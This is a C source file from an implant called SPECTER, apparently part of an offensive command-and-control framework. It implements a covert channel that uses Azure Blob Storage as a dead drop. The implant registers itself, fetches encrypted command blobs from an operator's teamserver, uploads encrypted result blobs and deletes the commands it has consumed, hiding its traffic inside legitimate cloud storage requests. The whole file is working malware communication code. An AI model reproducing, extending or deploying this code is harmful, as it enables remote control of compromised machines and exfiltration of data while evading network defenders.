/**
 * SPECTER Implant — Azure Blob Storage Dead Drop Channel
 *
 * Uses Azure Blob Storage as an encrypted dead drop mailbox.  Both the
 * implant and teamserver read/write the same storage account — there is
 * no direct TCP connection between them.
 *
 * Container layout:  session-{implant_id}/
 *   metadata           — registration blob (implant info JSON)
 *   command-{seq:06d}   — task blobs written by teamserver
 *   result-{seq:06d}    — result blobs written by implant
 *
 * All blobs are encrypted with ChaCha20-Poly1305 using the session key
 * derived from X25519 key agreement, then uploaded via raw HTTP PUT to
 * the Azure Blob REST API.  SAS tokens are per-container and scoped to
 * read/write/list/delete on that container only.
 *
 * No Azure SDK — all I/O is raw HTTP/1.1 over SChannel TLS.
 */

#include "specter.h"
#include "ntdefs.h"
#include "peb.h"
#include "crypto.h"
#include "config.h"
#include "comms.h"
#include "comms_azure.h"

/* ------------------------------------------------------------------ */
/*  Static state                                                       */
/* ------------------------------------------------------------------ */

static AZURE_CONTEXT g_azure_ctx;

/* ------------------------------------------------------------------ */
/*  Internal helpers                                                   */
/* ------------------------------------------------------------------ */

__attribute__((unused))
static void store32_le(BYTE *p, DWORD v) {
    p[0] = (BYTE)(v);
    p[1] = (BYTE)(v >> 8);
    p[2] = (BYTE)(v >> 16);
    p[3] = (BYTE)(v >> 24);
}

__attribute__((unused))
static DWORD load32_le(const BYTE *p) {
    return (DWORD)p[0] | ((DWORD)p[1] << 8) |
           ((DWORD)p[2] << 16) | ((DWORD)p[3] << 24);
}

/* Simple strlen for PIC */
static DWORD str_len(const char *s) {
    DWORD n = 0;
    while (s[n]) n++;
    return n;
}

/* Simple string copy with length limit */
static void str_copy(char *dst, const char *src, DWORD max) {
    DWORD i = 0;
    while (src[i] && i < max - 1) {
        dst[i] = src[i];
        i++;
    }
    dst[i] = '\0';
}

/* Simple string append */
static DWORD str_append(char *dst, DWORD offset, DWORD max,
                        const char *src) {
    DWORD i = 0;
    while (src[i] && offset + i < max - 1) {
        dst[offset + i] = src[i];
        i++;
    }
    dst[offset + i] = '\0';
    return offset + i;
}

/* Format DWORD as zero-padded 6-digit decimal */
static void fmt_seq(DWORD val, char *out) {
    int i;
    for (i = 5; i >= 0; i--) {
        out[i] = '0' + (char)(val % 10);
        val /= 10;
    }
    out[6] = '\0';
}

/* Parse decimal string to DWORD */
static DWORD parse_decimal(const char *s) {
    DWORD val = 0;
    while (*s >= '0' && *s <= '9') {
        val = val * 10 + (DWORD)(*s - '0');
        s++;
    }
    return val;
}

/* Simple strncmp */
static int str_ncmp(const char *a, const char *b, DWORD n) {
    DWORD i;
    for (i = 0; i < n; i++) {
        if (a[i] != b[i]) return (int)(BYTE)a[i] - (int)(BYTE)b[i];
        if (a[i] == '\0') return 0;
    }
    return 0;
}

/* ------------------------------------------------------------------ */
/*  URL construction                                                   */
/* ------------------------------------------------------------------ */

DWORD azure_build_blob_url(AZURE_CONTEXT *ctx, const char *blob_name,
                           char *url_out, DWORD url_out_len) {
    if (!ctx || !blob_name || !url_out || url_out_len == 0) return 0;

    /* https://{account}.blob.core.windows.net/{container}/{blob}?{sas} */
    DWORD pos = 0;
    pos = str_append(url_out, pos, url_out_len, "https://");
    pos = str_append(url_out, pos, url_out_len, ctx->account_name);
    pos = str_append(url_out, pos, url_out_len, ".blob.core.windows.net/");
    pos = str_append(url_out, pos, url_out_len, ctx->container);
    pos = str_append(url_out, pos, url_out_len, "/");
    pos = str_append(url_out, pos, url_out_len, blob_name);
    pos = str_append(url_out, pos, url_out_len, "?");
    pos = str_append(url_out, pos, url_out_len, ctx->sas_token);

    return pos;
}

DWORD azure_build_list_url(AZURE_CONTEXT *ctx, const char *prefix,
                           char *url_out, DWORD url_out_len) {
    if (!ctx || !url_out || url_out_len == 0) return 0;

    /* https://{account}.blob.core.windows.net/{container}?restype=container&comp=list&prefix={pfx}&{sas} */
    DWORD pos = 0;
    pos = str_append(url_out, pos, url_out_len, "https://");
    pos = str_append(url_out, pos, url_out_len, ctx->account_name);
    pos = str_append(url_out, pos, url_out_len, ".blob.core.windows.net/");
    pos = str_append(url_out, pos, url_out_len, ctx->container);
    pos = str_append(url_out, pos, url_out_len, "?restype=container&comp=list");
    if (prefix && prefix[0]) {
        pos = str_append(url_out, pos, url_out_len, "&prefix=");
        pos = str_append(url_out, pos, url_out_len, prefix);
    }
    pos = str_append(url_out, pos, url_out_len, "&");
    pos = str_append(url_out, pos, url_out_len, ctx->sas_token);

    return pos;
}

/* ------------------------------------------------------------------ */
/*  Sequence number formatting                                         */
/* ------------------------------------------------------------------ */

void azure_format_seq_blob(const char *prefix, DWORD seq,
                           char *name_out, DWORD name_out_len) {
    if (!prefix || !name_out || name_out_len == 0) return;

    DWORD pos = 0;
    pos = str_append(name_out, pos, name_out_len, prefix);

    char seq_str[8];
    fmt_seq(seq, seq_str);
    str_append(name_out, pos, name_out_len, seq_str);
}

DWORD azure_parse_seq_from_name(const char *blob_name, const char *prefix) {
    if (!blob_name || !prefix) return 0xFFFFFFFF;

    DWORD prefix_len = str_len(prefix);
    if (str_ncmp(blob_name, prefix, prefix_len) != 0) return 0xFFFFFFFF;

    return parse_decimal(blob_name + prefix_len);
}

/* ------------------------------------------------------------------ */
/*  Blob I/O — encrypted PUT/GET/DELETE via raw HTTP REST              */
/* ------------------------------------------------------------------ */

NTSTATUS azure_put_blob(AZURE_CONTEXT *ctx, COMMS_CONTEXT *comms,
                        const char *blob_name,
                        const BYTE *plaintext, DWORD plaintext_len) {
    if (!ctx || !comms || !blob_name || !plaintext) return STATUS_INVALID_PARAMETER;

    /* Build URL */
    char url[AZURE_MAX_URL_LEN];
    if (azure_build_blob_url(ctx, blob_name, url, sizeof(url)) == 0)
        return STATUS_BUFFER_OVERFLOW;

    /* Encrypt payload: [12-byte nonce][ciphertext][16-byte tag] */
    BYTE nonce[12];
    /* Generate nonce from session key + sequence (deterministic but unique) */
    spec_memset(nonce, 0, sizeof(nonce));
    nonce[0] = (BYTE)(ctx->msg_seq);
    nonce[1] = (BYTE)(ctx->msg_seq >> 8);
    nonce[2] = (BYTE)(ctx->msg_seq >> 16);
    nonce[3] = (BYTE)(ctx->msg_seq >> 24);
    ctx->msg_seq++;

    DWORD enc_size = 12 + plaintext_len + 16;
    if (enc_size > AZURE_SEND_BUF_SIZE - 512) /* leave room for headers */
        return STATUS_BUFFER_OVERFLOW;

    BYTE *enc_buf = ctx->send_buf;
    spec_memcpy(enc_buf, nonce, 12);
    spec_memcpy(enc_buf + 12, plaintext, plaintext_len);

    /* ChaCha20-Poly1305 AEAD encrypt in-place */
    NTSTATUS status;
    BYTE tag[16];
    spec_aead_encrypt(
        ctx->session_key, nonce,
        enc_buf + 12, plaintext_len,
        NULL, 0,                    /* no AAD */
        enc_buf + 12,               /* ciphertext overwrites plaintext */
        tag
    );

    spec_memcpy(enc_buf + 12 + plaintext_len, tag, 16);

    /* Parse host from account name for TLS connection */
    char host[AZURE_MAX_ACCOUNT_LEN + 32];
    DWORD hpos = 0;
    hpos = str_append(host, hpos, sizeof(host), ctx->account_name);
    hpos = str_append(host, hpos, sizeof(host), ".blob.core.windows.net");

    /* Connect via TLS */
    status = comms_tcp_connect(comms, host, 443);
    if (status != STATUS_SUCCESS) return status;

    status = comms_tls_init(comms);
    if (status != STATUS_SUCCESS) { comms_tcp_close(comms); return status; }

    status = comms_tls_handshake(comms, host);
    if (status != STATUS_SUCCESS) { comms_tcp_close(comms); return status; }

    /* Build HTTP PUT request */
    char extra_headers[256];
    DWORD ehpos = 0;
    ehpos = str_append(extra_headers, ehpos, sizeof(extra_headers),
                       "x-ms-version: ");
    ehpos = str_append(extra_headers, ehpos, sizeof(extra_headers),
                       AZURE_API_VERSION);
    ehpos = str_append(extra_headers, ehpos, sizeof(extra_headers),
                       "\r\nx-ms-blob-type: BlockBlob\r\n");

    /* Extract path from URL (after host) */
    char path[AZURE_MAX_URL_LEN];
    DWORD path_start = 8 + str_len(host); /* skip "https://" + host */
    str_copy(path, url + path_start, sizeof(path));

    DWORD req_len = comms_http_build_request(
        COMMS_HTTP_POST, /* PUT — reuse POST, just change method string */
        path, host, extra_headers,
        enc_buf, enc_size,
        comms->send_buf, COMMS_SEND_BUF_SIZE
    );

    /* Patch method to PUT (overwrite "POST" with "PUT ") */
    if (req_len > 4) {
        comms->send_buf[0] = 'P';
        comms->send_buf[1] = 'U';
        comms->send_buf[2] = 'T';
        comms->send_buf[3] = ' ';
    }

    status = comms_tls_send(comms, comms->send_buf, req_len);
    if (status != STATUS_SUCCESS) { comms_tls_close(comms); return status; }

    /* Read response */
    DWORD received = 0;
    status = comms_tls_recv(comms, comms->recv_buf, COMMS_RECV_BUF_SIZE, &received);
    comms_tls_close(comms);

    if (status != STATUS_SUCCESS) return status;

    /* Check for HTTP 201 Created */
    DWORD http_status = 0;
    comms_http_parse_response(comms->recv_buf, received, &http_status,
                              NULL, NULL, NULL, NULL);

    return (http_status == 201) ? STATUS_SUCCESS : STATUS_UNSUCCESSFUL;
}

NTSTATUS azure_get_blob(AZURE_CONTEXT *ctx, COMMS_CONTEXT *comms,
                        const char *blob_name,
                        BYTE *data_out, DWORD *data_len) {
    if (!ctx || !comms || !blob_name || !data_out || !data_len)
        return STATUS_INVALID_PARAMETER;

    /* Build URL */
    char url[AZURE_MAX_URL_LEN];
    if (azure_build_blob_url(ctx, blob_name, url, sizeof(url)) == 0)
        return STATUS_BUFFER_OVERFLOW;

    /* Parse host */
    char host[AZURE_MAX_ACCOUNT_LEN + 32];
    DWORD hpos = 0;
    hpos = str_append(host, hpos, sizeof(host), ctx->account_name);
    hpos = str_append(host, hpos, sizeof(host), ".blob.core.windows.net");

    /* Connect via TLS */
    NTSTATUS status = comms_tcp_connect(comms, host, 443);
    if (status != STATUS_SUCCESS) return status;

    status = comms_tls_init(comms);
    if (status != STATUS_SUCCESS) { comms_tcp_close(comms); return status; }

    status = comms_tls_handshake(comms, host);
    if (status != STATUS_SUCCESS) { comms_tcp_close(comms); return status; }

    /* Build HTTP GET request */
    char extra_headers[128];
    DWORD ehpos = 0;
    ehpos = str_append(extra_headers, ehpos, sizeof(extra_headers),
                       "x-ms-version: ");
    ehpos = str_append(extra_headers, ehpos, sizeof(extra_headers),
                       AZURE_API_VERSION);
    ehpos = str_append(extra_headers, ehpos, sizeof(extra_headers), "\r\n");

    char path[AZURE_MAX_URL_LEN];
    DWORD path_start = 8 + str_len(host);
    str_copy(path, url + path_start, sizeof(path));

    DWORD req_len = comms_http_build_request(
        COMMS_HTTP_GET, path, host, extra_headers,
        NULL, 0,
        comms->send_buf, COMMS_SEND_BUF_SIZE
    );

    status = comms_tls_send(comms, comms->send_buf, req_len);
    if (status != STATUS_SUCCESS) { comms_tls_close(comms); return status; }

    /* Read response */
    DWORD received = 0;
    status = comms_tls_recv(comms, comms->recv_buf, COMMS_RECV_BUF_SIZE, &received);
    comms_tls_close(comms);

    if (status != STATUS_SUCCESS) return status;

    /* Parse response */
    DWORD http_status = 0;
    const BYTE *body = NULL;
    DWORD body_len = 0;
    comms_http_parse_response(comms->recv_buf, received, &http_status,
                              NULL, NULL, &body, &body_len);

    if (http_status != 200) return STATUS_NOT_FOUND;

    /* Decrypt: body = [12-byte nonce][ciphertext][16-byte tag] */
    if (body_len < 12 + 16) return STATUS_DATA_ERROR;

    const BYTE *nonce = body;
    DWORD ct_len = body_len - 12 - 16;
    const BYTE *ciphertext = body + 12;
    const BYTE *tag = body + 12 + ct_len;

    if (ct_len > *data_len) return STATUS_BUFFER_TOO_SMALL;

    BOOL ok = spec_aead_decrypt(
        ctx->session_key, nonce,
        ciphertext, ct_len,
        NULL, 0,
        data_out,
        tag
    );

    if (!ok) return STATUS_UNSUCCESSFUL;

    *data_len = ct_len;
    return STATUS_SUCCESS;
}

NTSTATUS azure_delete_blob(AZURE_CONTEXT *ctx, COMMS_CONTEXT *comms,
                           const char *blob_name) {
    if (!ctx || !comms || !blob_name) return STATUS_INVALID_PARAMETER;

    /* Build URL */
    char url[AZURE_MAX_URL_LEN];
    if (azure_build_blob_url(ctx, blob_name, url, sizeof(url)) == 0)
        return STATUS_BUFFER_OVERFLOW;

    /* Parse host */
    char host[AZURE_MAX_ACCOUNT_LEN + 32];
    DWORD hpos = 0;
    hpos = str_append(host, hpos, sizeof(host), ctx->account_name);
    hpos = str_append(host, hpos, sizeof(host), ".blob.core.windows.net");

    /* Connect via TLS */
    NTSTATUS status = comms_tcp_connect(comms, host, 443);
    if (status != STATUS_SUCCESS) return status;

    status = comms_tls_init(comms);
    if (status != STATUS_SUCCESS) { comms_tcp_close(comms); return status; }

    status = comms_tls_handshake(comms, host);
    if (status != STATUS_SUCCESS) { comms_tcp_close(comms); return status; }

    /* Build HTTP DELETE request */
    char extra_headers[128];
    DWORD ehpos = 0;
    ehpos = str_append(extra_headers, ehpos, sizeof(extra_headers),
                       "x-ms-version: ");
    ehpos = str_append(extra_headers, ehpos, sizeof(extra_headers),
                       AZURE_API_VERSION);
    ehpos = str_append(extra_headers, ehpos, sizeof(extra_headers), "\r\n");

    char path[AZURE_MAX_URL_LEN];
    DWORD path_start = 8 + str_len(host);
    str_copy(path, url + path_start, sizeof(path));

    /* Build as GET then patch to DELETE */
    DWORD req_len = comms_http_build_request(
        COMMS_HTTP_GET, path, host, extra_headers,
        NULL, 0,
        comms->send_buf, COMMS_SEND_BUF_SIZE
    );

    /* Patch method: "GET " → "DELETE " (shift rest of buffer by 3) */
    if (req_len > 4 && req_len + 3 < COMMS_SEND_BUF_SIZE) {
        DWORD i;
        for (i = req_len + 2; i >= 7; i--) {
            comms->send_buf[i] = comms->send_buf[i - 3];
        }
        comms->send_buf[0] = 'D';
        comms->send_buf[1] = 'E';
        comms->send_buf[2] = 'L';
        comms->send_buf[3] = 'E';
        comms->send_buf[4] = 'T';
        comms->send_buf[5] = 'E';
        comms->send_buf[6] = ' ';
        req_len += 3;
    }

    status = comms_tls_send(comms, comms->send_buf, req_len);
    if (status != STATUS_SUCCESS) { comms_tls_close(comms); return status; }

    /* Read response */
    DWORD received = 0;
    status = comms_tls_recv(comms, comms->recv_buf, COMMS_RECV_BUF_SIZE, &received);
    comms_tls_close(comms);

    if (status != STATUS_SUCCESS) return status;

    DWORD http_status = 0;
    comms_http_parse_response(comms->recv_buf, received, &http_status,
                              NULL, NULL, NULL, NULL);

    /* 202 Accepted or 404 (already deleted) are both OK */
    return (http_status == 202 || http_status == 404) ? STATUS_SUCCESS : STATUS_UNSUCCESSFUL;
}

NTSTATUS azure_list_blobs(AZURE_CONTEXT *ctx, COMMS_CONTEXT *comms,
                          const char *prefix,
                          char names_out[][AZURE_MAX_BLOB_NAME_LEN],
                          DWORD max_names, DWORD *count_out) {
    if (!ctx || !comms || !names_out || !count_out)
        return STATUS_INVALID_PARAMETER;

    *count_out = 0;

    /* Build list URL */
    char url[AZURE_MAX_URL_LEN];
    if (azure_build_list_url(ctx, prefix, url, sizeof(url)) == 0)
        return STATUS_BUFFER_OVERFLOW;

    /* Parse host */
    char host[AZURE_MAX_ACCOUNT_LEN + 32];
    DWORD hpos = 0;
    hpos = str_append(host, hpos, sizeof(host), ctx->account_name);
    hpos = str_append(host, hpos, sizeof(host), ".blob.core.windows.net");

    /* Connect via TLS */
    NTSTATUS status = comms_tcp_connect(comms, host, 443);
    if (status != STATUS_SUCCESS) return status;

    status = comms_tls_init(comms);
    if (status != STATUS_SUCCESS) { comms_tcp_close(comms); return status; }

    status = comms_tls_handshake(comms, host);
    if (status != STATUS_SUCCESS) { comms_tcp_close(comms); return status; }

    /* Build HTTP GET request */
    char extra_headers[128];
    DWORD ehpos = 0;
    ehpos = str_append(extra_headers, ehpos, sizeof(extra_headers),
                       "x-ms-version: ");
    ehpos = str_append(extra_headers, ehpos, sizeof(extra_headers),
                       AZURE_API_VERSION);
    ehpos = str_append(extra_headers, ehpos, sizeof(extra_headers), "\r\n");

    char path[AZURE_MAX_URL_LEN];
    DWORD path_start = 8 + str_len(host);
    str_copy(path, url + path_start, sizeof(path));

    DWORD req_len = comms_http_build_request(
        COMMS_HTTP_GET, path, host, extra_headers,
        NULL, 0,
        comms->send_buf, COMMS_SEND_BUF_SIZE
    );

    status = comms_tls_send(comms, comms->send_buf, req_len);
    if (status != STATUS_SUCCESS) { comms_tls_close(comms); return status; }

    DWORD received = 0;
    status = comms_tls_recv(comms, comms->recv_buf, COMMS_RECV_BUF_SIZE, &received);
    comms_tls_close(comms);

    if (status != STATUS_SUCCESS) return status;

    DWORD http_status = 0;
    const BYTE *body = NULL;
    DWORD body_len = 0;
    comms_http_parse_response(comms->recv_buf, received, &http_status,
                              NULL, NULL, &body, &body_len);

    if (http_status != 200) return STATUS_UNSUCCESSFUL;

    /* Parse XML response to extract <Name> elements from <Blob> entries.
     * Minimal XML parsing — just scan for <Name>...</Name> tags. */
    DWORD count = 0;
    const char *p = (const char *)body;
    const char *end = p + body_len;

    while (p < end && count < max_names) {
        /* Find <Name> */
        const char *tag_start = NULL;
        const char *scan = p;
        while (scan + 6 < end) {
            if (scan[0] == '<' && scan[1] == 'N' && scan[2] == 'a' &&
                scan[3] == 'm' && scan[4] == 'e' && scan[5] == '>') {
                tag_start = scan + 6;
                break;
            }
            scan++;
        }
        if (!tag_start) break;

        /* Find </Name> */
        const char *tag_end = tag_start;
        while (tag_end + 7 < end) {
            if (tag_end[0] == '<' && tag_end[1] == '/' && tag_end[2] == 'N' &&
                tag_end[3] == 'a' && tag_end[4] == 'm' && tag_end[5] == 'e' &&
                tag_end[6] == '>') {
                break;
            }
            tag_end++;
        }
        if (tag_end + 7 >= end) break;

        DWORD name_len = (DWORD)(tag_end - tag_start);
        if (name_len < AZURE_MAX_BLOB_NAME_LEN) {
            DWORD i;
            for (i = 0; i < name_len; i++) {
                names_out[count][i] = tag_start[i];
            }
            names_out[count][name_len] = '\0';
            count++;
        }

        p = tag_end + 7;
    }

    *count_out = count;
    return STATUS_SUCCESS;
}

/* ------------------------------------------------------------------ */
/*  Channel interface implementation                                   */
/* ------------------------------------------------------------------ */

NTSTATUS azure_connect(IMPLANT_CONTEXT *ctx) {
    if (!ctx || !ctx->config) return STATUS_INVALID_PARAMETER;

    IMPLANT_CONFIG *cfg = cfg_get(ctx);
    if (!cfg) return STATUS_UNSUCCESSFUL;

    /* Find the Azure channel in config */
    DWORD ch_idx = 0xFFFFFFFF;
    DWORD i;
    for (i = 0; i < cfg->channel_count && i < CONFIG_MAX_CHANNELS; i++) {
        if (cfg->channels[i].type == 4) { /* CHANNEL_AZURE */
            ch_idx = i;
            break;
        }
    }
    if (ch_idx == 0xFFFFFFFF) return STATUS_NOT_FOUND;

    CHANNEL_CONFIG *ch = &cfg->channels[ch_idx];

    /* Initialize Azure context */
    spec_memset(&g_azure_ctx, 0, sizeof(g_azure_ctx));
    str_copy(g_azure_ctx.account_name, ch->url, AZURE_MAX_ACCOUNT_LEN);
    str_copy(g_azure_ctx.container, ch->sni_domain, AZURE_MAX_CONTAINER_LEN);
    str_copy(g_azure_ctx.sas_token, ch->host_domain, AZURE_MAX_SAS_TOKEN_LEN);

    /* Copy session key from main comms context */
    COMMS_CONTEXT *comms = (COMMS_CONTEXT *)ctx->comms_ctx;
    if (comms) {
        spec_memcpy(g_azure_ctx.session_key, comms->session_key, 32);
    }

    g_azure_ctx.send_seq = 0;
    g_azure_ctx.recv_seq = 0;
    g_azure_ctx.registered = FALSE;
    g_azure_ctx.state = COMMS_STATE_TLS_CONNECTED;

    /* Upload metadata blob for registration */
    /* Build a simple JSON registration payload */
    char meta[512];
    DWORD mpos = 0;
    mpos = str_append(meta, mpos, sizeof(meta), "{\"hostname\":\"");
    /* We don't have hostname here easily, so mark presence */
    mpos = str_append(meta, mpos, sizeof(meta), "registered");
    mpos = str_append(meta, mpos, sizeof(meta), "\",\"channel\":\"azure_deadrop\"}");

    NTSTATUS status = azure_put_blob(&g_azure_ctx, comms,
                                     AZURE_BLOB_METADATA,
                                     (const BYTE *)meta, mpos);
    if (status == STATUS_SUCCESS) {
        g_azure_ctx.registered = TRUE;
        g_azure_ctx.state = COMMS_STATE_REGISTERED;
    }

    return status;
}

NTSTATUS azure_send(IMPLANT_CONTEXT *ctx, const BYTE *data, DWORD len) {
    if (!ctx || !data) return STATUS_INVALID_PARAMETER;

    COMMS_CONTEXT *comms = (COMMS_CONTEXT *)ctx->comms_ctx;
    if (!comms) return STATUS_UNSUCCESSFUL;

    /* Build blob name: result-{seq:06d} */
    char blob_name[AZURE_MAX_BLOB_NAME_LEN];
    azure_format_seq_blob(AZURE_BLOB_PREFIX_RESULT,
                          g_azure_ctx.send_seq,
                          blob_name, sizeof(blob_name));

    NTSTATUS status = azure_put_blob(&g_azure_ctx, comms,
                                     blob_name, data, len);

    if (status == STATUS_SUCCESS) {
        g_azure_ctx.send_seq++;
    }

    return status;
}

NTSTATUS azure_recv(IMPLANT_CONTEXT *ctx, BYTE *data_out, DWORD *data_len) {
    if (!ctx || !data_out || !data_len) return STATUS_INVALID_PARAMETER;

    COMMS_CONTEXT *comms = (COMMS_CONTEXT *)ctx->comms_ctx;
    if (!comms) return STATUS_UNSUCCESSFUL;

    /* Try to get the next expected command blob */
    char blob_name[AZURE_MAX_BLOB_NAME_LEN];
    azure_format_seq_blob(AZURE_BLOB_PREFIX_CMD,
                          g_azure_ctx.recv_seq,
                          blob_name, sizeof(blob_name));

    NTSTATUS status = azure_get_blob(&g_azure_ctx, comms,
                                     blob_name, data_out, data_len);

    if (status == STATUS_SUCCESS) {
        /* Delete the consumed command blob */
        azure_delete_blob(&g_azure_ctx, comms, blob_name);
        g_azure_ctx.recv_seq++;
    }

    return status;
}

NTSTATUS azure_disconnect(IMPLANT_CONTEXT *ctx) {
    if (!ctx) return STATUS_INVALID_PARAMETER;

    /* Zero out sensitive material */
    spec_memset(g_azure_ctx.session_key, 0, sizeof(g_azure_ctx.session_key));
    spec_memset(g_azure_ctx.sas_token, 0, sizeof(g_azure_ctx.sas_token));
    g_azure_ctx.state = COMMS_STATE_DISCONNECTED;
    g_azure_ctx.registered = FALSE;

    return STATUS_SUCCESS;
}

NTSTATUS azure_health_check(IMPLANT_CONTEXT *ctx) {
    if (!ctx) return STATUS_INVALID_PARAMETER;

    COMMS_CONTEXT *comms = (COMMS_CONTEXT *)ctx->comms_ctx;
    if (!comms) return STATUS_UNSUCCESSFUL;

    /* Try to list blobs with metadata prefix — if we get 200 OK the
     * storage account is reachable and our SAS token is valid. */
    char names[1][AZURE_MAX_BLOB_NAME_LEN];
    DWORD count = 0;

    NTSTATUS status = azure_list_blobs(&g_azure_ctx, comms,
                                       AZURE_BLOB_METADATA,
                                       names, 1, &count);

    return status;
}

/* ------------------------------------------------------------------ */
/*  Test support                                                       */
/* ------------------------------------------------------------------ */

#ifdef TEST_BUILD
AZURE_CONTEXT *azure_get_context(void) {
    return &g_azure_ctx;
}

void azure_test_reset_context(AZURE_CONTEXT *ctx) {
    if (ctx) {
        spec_memset(ctx, 0, sizeof(AZURE_CONTEXT));
    }
}
#endif
